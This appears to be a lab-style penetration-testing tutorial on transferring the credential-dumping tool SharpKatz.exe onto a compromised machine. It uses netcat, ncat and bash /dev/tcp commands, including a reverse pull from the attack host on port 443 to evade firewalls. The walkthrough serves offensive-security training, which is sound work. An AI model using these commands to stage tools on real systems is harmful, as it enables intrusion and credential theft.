-----
In this example, we'll transfer [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) from our Pwnbox onto the compromised machine. We'll do it using two methods. Let's work through the first one.


#### NetCat - Compromised Machine - Listening on Port 8000
- Start Netcat (nc) with the listening option `-l`, selecting the port to listen with the option `-p 8000` and redirect the stdout using the single greater than `>` followed by the filename.

```bash
nc -l -p 8000 > SharpKatz.exe
```

#### Netcat - Attack Host - Sending File to Compromised machine

```bash
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
```

- From our attack host we connect to the target machine on port 8000 and send the file as input to Netcat. The option `-q 0` will tell Netcat to close the connection once it finishes.

```bash
nc -q 0 <target-ip> 8000 < SharpKatz.exe
```

Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections.

#### Attack Host - Sending File as Input to Netcat
```bash
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### Compromised Machine Connect to Netcat to Receive the File

```bash
nc <attack-host-ip> 443 > SharkKatz.exe
```

---
#### Ncat - Compromised Machine - Listening on Port 8000
- If the compromised machine is using Ncat, we'll need to specify `--recv-only` to close the connection once the file transfer is finished.
```bash
ncat -l -p 8000 -recv-only > SharpKatz.exe
```
##### Ncat - Attack Host - Sending File to Compromised machine

 - By utilizing Ncat, we can opt for `--send-only` rather than `-q`.

```bash
ncat --send-only <target-ip> 8000 < SharpKatz.exe
```

#### Attack Host - Sending File as Input to Ncat

```bash
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### Compromised Machine Connect to Ncat to Receive the File

```bash
ncat <attack-host-ip> 443 --recv-only > SharpKatz.exe
```

---
If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file `/dev/TCP/`.

Writing to this particular file makes Bash open a TCP connection to `host:port`, and this feature may be used for file transfers.

```bash
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File

```bash
cat < /dev/tcp/<attack-host-ip>/443 > SharpKatz.exe
```

